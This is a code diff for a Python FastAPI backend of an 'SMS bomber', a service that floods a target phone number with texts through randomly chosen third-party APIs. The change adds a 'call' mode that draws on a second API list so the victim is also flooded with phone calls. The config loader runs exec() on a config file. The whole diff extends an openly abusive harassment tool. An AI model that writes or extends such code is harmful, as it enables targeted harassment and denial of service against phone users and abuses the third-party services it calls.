@@ -8,44 +8,24 @@ from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 from typing import List, Dict, Any
 
-# Import the API list
+# Import the API lists
 try:
     try:
-        from .api_config import apis
+        from .api_config import apis, call_apis
     except (ImportError, ValueError):
-        from api_config import apis
+        from api_config import apis, call_apis
 except ImportError:
-    # If the file structure is slightly different or it's a list in a variable
-    # We might need to handle how it's defined in api_config.py
-    # Let's assume it's a variable named 'apis'
-    # Actually, looking at the file earlier, it was a list of dicts.
-    # If it's not assigned to a variable, we might need to load it differently.
     import sys
     import os
     sys.path.append(os.getcwd())
-    # We might need to read the file and evaluate it if it's just a raw list
-    with open('api_config.py', 'r', encoding='utf-8') as f:
+    with open('api/api_config.py', 'r', encoding='utf-8') as f:
         content = f.read()
-        # Find the list. It starts with [ and ends with ]
-        # We need to make sure we have 'json' and 'random' available for lambdas
-        import json as json_mod
-        import random as random_mod
-        # Define the environment for eval
-        env = {'json': json_mod, 'random': random_mod}
-        # The file content itself might be the list definition
-        # or it might be apis = [...]
-        if 'apis =' in content:
-            exec(content, env)
-            apis = env['apis']
-        else:
-            # Try to eval the whole thing if it's just a list
-            try:
-                apis = eval(content, env)
-            except:
-                # Fallback: find the first '[' and last ']'
-                start = content.find('[')
-                end = content.rfind(']') + 1
-                apis = eval(content[start:end], env)
+    import json as json_mod
+    import random as random_mod
+    env = {'json': json_mod, 'random': random_mod}
+    exec(content, env)
+    apis = env.get('apis', [])
+    call_apis = env.get('call_apis', [])
 
 app = FastAPI()
 
@@ -61,6 +41,7 @@ app.add_middleware(
 class BombRequest(BaseModel):
     phone: str
     count: int = 10
+    mode: str = "sms"
 
 # In-memory status tracking
 bombing_status = {}
@@ -138,8 +119,12 @@ async def send_bomb(phone: str, count: int, bomb_id: str):
 
 @app.post("/api/bomb/single")
 async def bomb_single(request: BombRequest):
-    # Pick a random API for this specific request
-    api = random.choice(apis)
+    # Pick the correct API list based on mode
+    api_list = call_apis if request.mode == "call" else apis
+    if not api_list:
+         return {"success": False, "error": f"No APIs found for {request.mode} mode"}
+         
+    api = random.choice(api_list)
     phone = request.phone
     
     url = api["url"]
